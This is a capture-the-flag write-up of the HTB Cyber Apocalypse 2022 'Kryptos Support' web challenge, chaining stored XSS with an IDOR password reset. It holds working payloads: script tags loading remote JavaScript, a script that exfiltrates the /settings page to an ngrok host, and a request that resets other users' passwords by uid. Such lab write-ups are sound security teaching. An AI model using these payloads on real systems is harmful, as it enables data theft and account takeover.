---
title: "Kryptos Support challenge Writeup"
author: "0xMesbaha"
cover: "/media/CTFs/Flag.png"
tags: ["CTF", "XSS", "IDOR"]
date: 2022-05-19T12:49:18+34:08
categories:
  - web
draft: false
---

HTB Cyber Apocalypse CTF 2022 was held from the 14th of May Until the 19th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy

<!--more-->

|           |                                                                                      |
| --------- | ------------------------------------------------------------------------------------ |
| CTF name  | [Cyber Apocalypse CTF 2022](https://www.hackthebox.com/events/cyber-apocalypse-2022) |
| challenge | Kryptos Support                                                                      |
| category  | web                                                                                  |
| about     | XSS , IDOR                                                                           |
| team      | [0xCha0s](https://ctftime.org/team/168238)                                           |

## Discovery :

This easy challenge are introduced with this page , as we see just add a report issue interface:

![image](/media/CTFs/Kryptos-Support/20220517090100.png)

There is also end point `/login` But there is no `/signup` or `register`

![image](/media/CTFs/Kryptos-Support/20220517090146.png)

and First thing i have tried is to get xss , i used xsshunter as a proof only latter on will use ngrok http server :

```html
<script src=https://XXXXXXX.xss.ht></script>
```

and we get a hit :

![image](/media/CTFs/Kryptos-Support/20220517090357.png)

we know from the report the following :

- vulnerable page `http://127.0.0.1:1337/tickets/new`
- the session used is JWT based: `session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI3NzEwMTh9.iQshqI16zGjE3tUOVQHsqLKaZofC8JyFN4CWhHH6lWg`
- and from the DOM we can see there are other internal end points which are `/settings` and `/logout`

Decoding the cookie we got the username and the uid

![image](/media/CTFs/Kryptos-Support/20220517090628.png)

## Attacking :

I wanted to get an overview about what functions are there in the `/settings` page. so we craft this payload :

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1:1337/settings");
xhr.onload = function () {
  var out = btoa(xhr.responseText);
  var exfil = new XMLHttpRequest();
  exfil.open("GET", "http://3bbd-156-194-235-84.ngrok.io/?out=" + out);
  exfil.send();
};
xhr.send();
```

and will use this payload at the report page to request the script we host :

```html
<script src="http://3bbd-156-194-235-84.ngrok.io/get.js"></script>
```

![image](/media/CTFs/Kryptos-Support/20220517091750.png)

decoding it :

![image](/media/CTFs/Kryptos-Support/20220517091900.png)

will notice the page has the update password function also , we can check the Js code under `/static/js/settings.js` and it is publicly exposed :

```Javascript
$(document).ready(function() {
	$("#update-btn").on('click', updatePassword);

});

async function updatePassword() {

	$('#update-btn').prop('disabled', true);

	let card = $("#resp-msg");
    card.text('Updating password, please wait');
	card.show();

	let uid = $("#uid").val();
	let password1 = $("#password1").val();
	let password2 = $("#password2").val();

	if ($.trim(password1) === '' || password1 !== password2) {
		$('#update-btn').prop('disabled', false);
		card.text("Please type-in the same password!");
		card.show();
		return;
	}

	await fetch(`/api/users/update`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({password: password1, uid}),
		})
		.then((response) => response.json()
			.then((resp) => {
				card.text(resp.message);
				card.show();
			}))
		.catch((error) => {
			card.text(error);
			card.show();
		});

    $('#update-btn').prop('disabled', false);
}
```

The catch here is that it doesn't check the old password , just providing the uid and the new password will reset the password. we can confirm with this script which will reset the password of the moderator user

```javascript
var xhr = new XMLHttpRequest();
var theUrl = "http://127.0.0.1:1337/api/users/update";
xhr.open("POST", theUrl);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send(JSON.stringify({ password: "testme123", uid: "100" }));
```

And we have successfully logged in with the new password and the username `moderator` :

![image](/media/CTFs/Kryptos-Support/20220517092343.png)

Now why not reset the password for the user **`admin`** too ? , as it doesn't check on the `uid` , we can run intruder to fuzz the admin uid But for our luck it is **`1`** . from the moderator account we can reset the password without the need to use javascript code and ngrok hosting it

![image](/media/CTFs/Kryptos-Support/20220517093121.png)

and now we can login with the admin user

![image](/media/CTFs/Kryptos-Support/20220517093228.png)
